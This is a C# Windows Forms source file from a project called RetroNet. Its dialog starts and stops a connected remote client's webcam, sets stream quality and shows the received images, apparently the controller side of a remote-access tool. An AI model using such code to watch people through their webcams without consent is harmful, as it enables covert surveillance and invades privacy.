using RetroNet.Classes;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RetroNet.Forms
{
    public partial class WebcamDialog : Form
    {
        private Connection _client;

        public WebcamDialog(Connection client)
        {
            InitializeComponent();

            _client = client;
        }

        private void WebcamDialog_Load(object sender, EventArgs e)
        {
            _client.send(new Packet(Command.StartWebcam).toArray());
        }

        private void WebcamDialog_FormClosing(object sender, FormClosingEventArgs e)
        {
            _client.send(new Packet(Command.StopWebcam).toArray());
        }

        private void qualityTrackBar_Scroll(object sender, EventArgs e)
        {
            Packet toSend = new Packet(Command.WebcamQuality);

            toSend.addData((qualityTrackBar.Value * 2).ToString());
            _client.send(toSend.toArray());
        }

        public void updateImage(Image img)
        {
            lock (webcamPictureBox)
            {
                if (img != null)
                    webcamPictureBox.Image = img;
            }
        }
    }
}
